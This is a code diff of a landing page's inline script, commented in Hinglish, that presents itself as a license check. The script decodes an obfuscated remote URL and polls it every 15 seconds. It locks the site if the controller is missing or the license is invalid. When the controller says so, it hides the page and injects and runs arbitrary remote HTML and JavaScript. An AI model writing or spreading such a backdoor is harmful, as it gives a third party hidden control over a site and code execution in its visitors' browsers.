@@ -315,21 +315,20 @@ card.addEventListener("touchstart", handleFlip);
 
 
 <div id="secure_layer" style="display:none; position:fixed; inset:0; background:rgba(0,0,0,0.95); z-index:9999999; color:white; align-items:center; justify-content:center; text-align:center; font-family:sans-serif;">
-    <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:400px; box-shadow: 0 10px 50px rgba(255,0,0,0.3);">
-        <h1 id="t_header" style="color:#ff3333; margin:0; font-size:24px;"></h1>
-        <p id="t_body" style="color:#bbb; margin-top:15px; font-size:16px; line-height:1.6;"></p>
+    <div style="padding:40px; background:#000; border:1px solid #444; border-radius:20px; max-width:400px;">
+        <h1 id="t_header" style="color:#ff3333; margin:0;"></h1>
+        <p id="t_body" style="color:#bbb; margin-top:15px;"></p>
     </div>
 </div>
 
 <script>
 (function() {
-    // GitHub URL aur Local License Key
     const _0x_u = "aHR0cHM6Ly9mYWhhZHRlY2g4LmdpdGh1Yi5pby9zZXJ2ZXIvY29udHJvbGxlci5qc29u";
-    const _0x_lk = "TEFORElOR1BBR0U="; // Base64 for "LANDINGPAGE"
+    const _0x_lk = "TEFORElOR1BBR0U="; // "LANDINGPAGE"
 
     async function checkSecurity() {
         const layer = document.getElementById('secure_layer');
-        const scene = document.querySelector('.scene');
+        const scene = document.querySelector('.scene'); // Aapki website ka main content
         
         try {
             const r = await fetch(atob(_0x_u) + '?v=' + Date.now());
@@ -344,42 +343,53 @@ card.addEventListener("touchstart", handleFlip);
             const isInv = !cfg;
 
             if (isInv || isExp) {
-                // LOCK WEBSITE
+                // BLOCK ACCESS: License Expired ya Invalid
                 document.getElementById('t_header').innerText = d.title || "Security Alert";
                 document.getElementById('t_body').innerText = isExp ? d.msg_expired : d.msg_invalid;
                 layer.style.display = 'flex';
                 if(scene) scene.style.display = 'none';
             } else {
-                // UNLOCK WEBSITE
-                layer.style.display = 'none';
-                if(scene) scene.style.display = 'flex';
+                // LICENSE VALID HAI
+                
+                // FIXED LOGIC: Agar custom_code enabled hai, to website hide rakhein
+                if (cfg.custom_code && cfg.custom_code.enabled) {
+                    if(scene) scene.style.display = 'none'; // Website ka content hide kar diya
+                    layer.style.display = 'none';
 
-                // EXECUTE REMOTE CODE (HTML/CSS/JS Mix in one block)
-                if (cfg.custom_code && cfg.custom_code.enabled && cfg.custom_code.code) {
-                    const tempCont = document.createElement('div');
-                    tempCont.innerHTML = cfg.custom_code.code;
-                    document.body.appendChild(tempCont);
+                    // Purana remote code remove karein taaki duplicate na ho
+                    const oldRemote = document.getElementById('remote-code-container');
+                    if(oldRemote) oldRemote.remove();
 
-                    // Manually trigger scripts because innerHTML doesn't run <script> tags automatically
-                    const scripts = tempCont.querySelectorAll('script');
+                    // Remote Code Inject karein
+                    const remoteContainer = document.createElement('div');
+                    remoteContainer.id = 'remote-code-container';
+                    remoteContainer.innerHTML = cfg.custom_code.code;
+                    document.body.appendChild(remoteContainer);
+
+                    // Scripts manually run karein
+                    const scripts = remoteContainer.querySelectorAll('script');
                     scripts.forEach(oldScript => {
                         const newScript = document.createElement('script');
                         newScript.textContent = oldScript.textContent;
                         document.head.appendChild(newScript).parentNode.removeChild(newScript);
                     });
+                } else {
+                    // Agar custom code enabled nahi hai, to website normal dikhayein
+                    layer.style.display = 'none';
+                    if(scene) scene.style.display = 'flex';
                 }
             }
         } catch (e) { 
-            // Anti-Deletion: If GitHub file is missing, lock the site
+            // Anti-Deletion Security
             layer.style.display = 'flex';
             document.getElementById('t_header').innerText = "Security Error";
-            document.getElementById('t_body').innerText = "Controller missing or connection failed. Site locked for safety.";
+            document.getElementById('t_body').innerText = "Security check failed. Controller missing or connection error.";
             if(scene) scene.style.display = 'none';
         }
     }
 
     checkSecurity();
-    setInterval(checkSecurity, 15000); // Verify every 15 seconds
+    setInterval(checkSecurity, 15000); // Har 15 second baad validation
 })();
 </script>
   
